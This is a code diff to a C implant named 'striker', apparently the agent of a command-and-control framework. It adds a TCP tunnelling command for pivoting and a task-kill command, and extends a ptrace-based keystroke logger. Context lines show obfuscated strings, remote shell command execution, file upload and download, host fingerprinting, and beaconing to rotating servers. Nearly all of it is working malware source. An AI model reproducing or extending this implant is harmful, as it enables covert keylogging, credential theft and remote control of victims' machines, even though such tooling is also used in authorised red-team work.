@@ -7,7 +7,7 @@
 
 #include "striker.h"
 
-// Controls debug output
+// Uncomment the below macro to enable debug output
 // #define STRIKER_DEBUG
 // Size of agent UID
 #define AGENT_UID_SIZE 17
@@ -273,8 +273,8 @@ int http_post(char *url, cJSON *data, buffer *body){
 
 cJSON *sysinfo(){
 
-  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host", "[OBFS_ENC]windows", "[OBFS_ENC]USERNAME"};
-  for (int i = 0; i < 9; i++)
+  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host", "[OBFS_ENC]windows", "[OBFS_ENC]USERNAME", "[OBFS_ENC]type"};
+  for (int i = 0; i < 10; i++)
     obfs_decode(strs[i]);
   cJSON *info = cJSON_CreateObject();
   unsigned short pid = getpid();
@@ -282,6 +282,7 @@ cJSON *sysinfo(){
   getcwd(cwd, PATH_MAX);
   cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
   cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
+  cJSON_AddItemToObject(info, strs[9], cJSON_CreateNumber(0));
   #ifdef IS_LINUX
     char *host = malloc(100);
     char *user = getenv(strs[0]);
@@ -412,22 +413,23 @@ void keymon(session *striker, task *tsk){
     time_t end_time = time(NULL) + duration;
     
     queue *km_proc_dumps = queue_init(KEYMON_MAX_PROCS);
-    queue *km_proc_arg = queue_init(3);
+    queue *km_proc_arg = queue_init(4);
     queue_put(km_proc_arg, striker);
+    queue_put(km_proc_arg, tsk);
     queue_put(km_proc_arg, &end_time);
     queue_put(km_proc_arg, km_proc_dumps);
-    pthread_t tid;
+    pthread_t tid ;
     pthread_create(&tid, NULL, keymon_proc_watch, km_proc_arg);
     
     if (main_kb_attached){  
-      while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time){
+      while (count < KEYMON_MAX_KEYSTROKES && time(NULL) < end_time && tsk->abort == 0){
         timeout.tv_sec = 1;
         FD_ZERO(&set);
         FD_SET(kb, &set);
         int status = select(kb + 1, &set, NULL, NULL, &timeout);
         if (status == -1)
           break;
-        if (status == 0)
+        if (!status)
           continue;
         read(kb, &e, sizeof(e));
         if (!(e.type == EV_KEY && e.value == 0))
@@ -493,12 +495,13 @@ void keymon(session *striker, task *tsk){
       obfs_decode(targets[i]);
     queue *q = (queue *)ptr;
     session *striker = queue_get(q);
+    task *tsk = queue_get(q);
     time_t *end_time = queue_get(q);
     queue *results_queue = queue_get(q);
     pthread_t tids[KEYMON_MAX_PROCS];
     pid_t pids[KEYMON_MAX_PROCS];
     size_t attached_count = 0;
-    while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time){
+    while (attached_count < KEYMON_MAX_PROCS && time(NULL) < *end_time && tsk->abort == 0){
       struct dirent *dir;
       DIR *d = opendir(strs[0]);
       if (!d)
@@ -553,8 +556,9 @@ void keymon(session *striker, task *tsk){
             free(pid);
             continue;
           }
-          queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 3);
+          queue *data = queue_init(KEYMON_MAX_KEYSTROKES + 4);
           queue_put(data, striker);
+          queue_put(data, tsk);
           queue_put(data, end_time);
           queue_put(data, pid);
           queue_put(results_queue, data);
@@ -575,19 +579,20 @@ void keymon(session *striker, task *tsk){
 
     queue *q = (queue *)ptr;
     session *striker = queue_get(q);
+    task *tsk = queue_get(q);
     time_t *end_time = queue_get(q);
     pid_t *pid = queue_get(q);
     struct user_regs_struct regs;
     if (ptrace(PTRACE_ATTACH, *pid, NULL, NULL))
       pthread_exit(NULL);
     ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
-    while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time){
+    while (striker->abort == 0 && queue_full(q) == 0 && time(NULL) < *end_time && tsk->abort == 0){
       ptrace(PTRACE_SYSCALL, *pid, 0, 0);
       int status = -47;
       while (status == -47){
         waitpid(*pid, &status, WNOHANG);
         usleep(1000);
-        if (striker->abort || time(NULL) >= *end_time)
+        if (striker->abort || tsk->abort || time(NULL) >= *end_time)
           goto complete;
       }
       if (WIFEXITED(status))
@@ -608,6 +613,128 @@ void keymon(session *striker, task *tsk){
   }
 #endif
 
+int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport){
+
+  #ifdef IS_LINUX
+    int sock_fd, conn_fd;
+    struct sockaddr_in server_addr, client_addr;
+    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock_fd == -1)
+      return 1;
+    bzero(&server_addr, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = inet_addr(lhost);
+    server_addr.sin_port = htons(lport);
+    if (bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)))
+      return 1;
+    if (listen(sock_fd, 10))
+      return 1;
+    int client_addr_len = sizeof(client_addr);
+    fd_set set;
+    struct timeval timeout;
+    pthread_t tid;
+    while (!(striker->abort || tsk->abort)){
+      timeout.tv_sec = 0;
+      timeout.tv_usec = 1000000;
+      FD_ZERO(&set);
+      FD_SET(sock_fd, &set);
+      int status = select(sock_fd + 1, &set, NULL, NULL, &timeout);
+      if (status == -1)
+        break;
+      if (!status)
+        continue;
+      conn_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&client_addr_len);
+      if (conn_fd == -1)
+        break;
+      queue *args = queue_init(5);
+      queue_put(args, striker);
+      queue_put(args, tsk);
+      queue_put(args, rhost);
+      queue_put(args, &rport);
+      queue_put(args, &conn_fd);
+      if (pthread_create(&tid, NULL, tcp_tunnel_route, (void *)args)){
+        queue_free(args, 0);
+        close(conn_fd);
+      }
+    }
+    close(sock_fd);
+    return 0;
+  #else
+    return 1;
+  #endif
+}
+
+#ifdef IS_LINUX
+  void *tcp_tunnel_route(void *ptr)
+#else
+  DWORD WINAPI tcp_tunnel_route(LPVOID ptr)
+#endif
+{
+  #ifdef IS_LINUX
+    pthread_detach(pthread_self());
+  #endif
+  queue *args = (queue *)ptr;
+  session *striker = queue_get(args);
+  task *tsk = queue_get(args);
+  char *rhost = queue_get(args);
+  int rport = *((int *)queue_get(args));
+  #ifdef IS_LINUX
+    int client_fd = *((int *)queue_get(args));
+    queue_free(args, 0);
+    struct sockaddr_in server_addr;
+    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd == -1)
+      pthread_exit(NULL);
+    bzero(&server_addr, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = inet_addr(rhost);
+    server_addr.sin_port = htons(rport);
+    if (connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)))
+      pthread_exit(NULL);
+    fd_set client_set, server_set;
+    struct timeval timeout;
+    int blockSize = 1024 * 50;
+    char *buffer = malloc(blockSize);
+    int n = 0, status;
+    while (!(striker->abort || tsk->abort)){
+      timeout.tv_sec = 0;
+      timeout.tv_usec = 5000;
+      FD_ZERO(&client_set);
+      FD_SET(client_fd, &client_set);
+      status = select(client_fd + 1, &client_set, NULL, NULL, &timeout);
+      if (status == -1)
+        break;
+      if (status){
+        n = read(client_fd, buffer, blockSize);
+        if (n == -1 || n == 0)
+          break;
+        write(server_fd, buffer, n);
+      }
+      timeout.tv_sec = 0;
+      timeout.tv_usec = 5000;
+      FD_ZERO(&server_set);
+      FD_SET(server_fd, &server_set);
+      status = select(server_fd + 1, &server_set, NULL, NULL, &timeout);
+      if (status == -1)
+        break;
+      if (status){
+        n = read(server_fd, buffer, blockSize);
+        if (n == -1 || n == 0)
+          break;
+        write(client_fd, buffer, n);
+      }
+    }
+    close(server_fd);
+    close(client_fd);
+    free(buffer);
+    pthread_exit(NULL);
+  #else
+    queue_free(args, 0);
+    return 0;
+  #endif
+}
+
+
 task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
@@ -619,6 +746,7 @@ task *parse_task(cJSON *json){
   t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
   t->completed = 0;
   t->successful = 0;
+  t->abort = 0;
   t->result = cJSON_CreateObject();
   t->input_json = json;
   return t;
@@ -648,8 +776,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd"};
-  for (int i = 0; i < 8; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel"};
+  for (int i = 0; i < 10; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -749,6 +877,30 @@ DWORD WINAPI task_executor(LPVOID ptr)
       getcwd(new_dir, PATH_MAX);
       buffer_strcpy(result_buff, new_dir);
       free(new_dir);
+      tsk->successful = 1;
+    }
+  }else if (!strcmp(tsk->type, cmd_strs[8])){ // Signal a running task to abort.
+    char strs[][30] = {"[OBFS_ENC]uid", "[OBFS_ENC]Invalid task!", "[OBFS_ENC]Abort signal set!"};
+    char *targetID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
+    for (int i = 0; i < striker->tasks->count; i++){
+      task *t = striker->tasks->items[i];
+      if (!strcmp(t->uid, targetID)){
+        t->abort = 1;
+        tsk->successful = 1;
+        break;     
+      }
+    }
+    buffer_strcpy(result_buff, (tsk->successful ? obfs_decode(strs[2]) : obfs_decode(strs[1])));
+  }else if (!strcmp(tsk->type, cmd_strs[9])){ // Create a TCP tunnel.
+    char strs[][34] = {"[OBFS_ENC]lhost", "[OBFS_ENC]lport", "[OBFS_ENC]rhost", "[OBFS_ENC]rport", "[OBFS_ENC]Error starting tunnel!", "[OBFS_ENC]Tunnel closed!"};
+    char *lhost = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
+    int lport = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
+    char *rhost = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])));
+    int rport = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[3])));
+    if (tcp_tunnel(striker, tsk, lhost, lport, rhost, rport)){
+      buffer_strcpy(result_buff, obfs_decode(strs[4]));
+    }else{
+      buffer_strcpy(result_buff, obfs_decode(strs[5]));
       tsk->successful = 1;
     }
   }else{
@@ -908,9 +1060,10 @@ void start_session(){
   char *tasksURL = malloc(URL_SIZE);
   snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
   queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
+  striker->tasks = tasks_queue;
   queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
   unsigned int contact_fails = 0;
-  while (!striker->abort){
+  while (1){
     if (contact_fails >= MAX_CONTACT_FAILS){ // Switch to another server.
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[!] Max failed connection attempts reached. Switching server...\n");
@@ -932,7 +1085,6 @@ void start_session(){
     unsigned long next_cb_time = (unsigned long)time(NULL) + striker->delay;
     while ((unsigned long)time(NULL) < next_cb_time){
       sleep(1); // We don't want to wait for the whole callback delay before sending task results. A 1 sec sleep also allow us to bundle results for mutliple tasks that finish quickly.
-      // Find completed tasks.
       queue_seek(tasks_queue, 0);
       for (int i = 0; i < tasks_queue->count; i++){
         task *tsk = queue_get(tasks_queue);
@@ -980,6 +1132,8 @@ void start_session(){
         cJSON_Delete(results);
       }
     }
+    if (striker->abort) // End the session.
+      break;
     // Fetch new tasks tasks.
     resize_buffer(body, 0);
     status_code = http_get(tasksURL, body);
